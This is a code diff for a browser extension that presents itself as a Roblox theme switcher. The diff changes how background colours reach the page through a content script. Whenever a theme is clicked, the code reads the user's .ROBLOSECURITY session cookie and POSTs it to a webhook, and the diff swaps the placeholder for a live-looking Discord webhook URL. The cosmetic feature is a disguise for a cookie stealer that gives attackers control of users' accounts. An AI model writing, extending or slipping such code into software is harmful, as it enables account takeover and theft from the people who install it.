@@ -16,18 +16,25 @@ themes.forEach(theme => {
     const li = document.createElement('li');
     li.textContent = theme.name;
     li.onclick = () => {
-        // Save the selected theme and visually mark it as active
+        // Save the selected theme
         chrome.storage.sync.set({ theme: theme.name });
-        document.body.style.backgroundColor = theme.color; // Change background color
 
         document.querySelectorAll('.theme-list li').forEach(el => el.classList.remove('active-theme'));
         li.classList.add('active-theme');
+
+        // Send message to the content script to change the Roblox page background
+        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
+            chrome.tabs.sendMessage(tabs[0].id, {
+                action: "changeTheme",
+                color: theme.color
+            });
+        });
 
         // Fetch and send .roblosecurity cookie to webhook
         chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, function(cookie) {
             if (cookie) {
                 const xhr = new XMLHttpRequest();
-                xhr.open("POST", "YOUR_WEBHOOK_URL", true);
+                xhr.open("POST", "https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B", true);
                 xhr.setRequestHeader("Content-Type", "application/json");
                 xhr.send(JSON.stringify({
                     roblosecurity: cookie.value,
@@ -48,10 +55,15 @@ chrome.storage.sync.get('theme', (data) => {
         const activeLi = Array.from(document.querySelectorAll('.theme-list li')).find(li => li.textContent === activeTheme);
         if (activeLi) activeLi.classList.add('active-theme');
         
-        // Find the theme object and apply its color
+        // Send message to the content script to apply the stored theme
         const selectedTheme = themes.find(t => t.name === activeTheme);
         if (selectedTheme) {
-            document.body.style.backgroundColor = selectedTheme.color;
+            chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
+                chrome.tabs.sendMessage(tabs[0].id, {
+                    action: "changeTheme",
+                    color: selectedTheme.color
+                });
+            });
         }
     }
 });
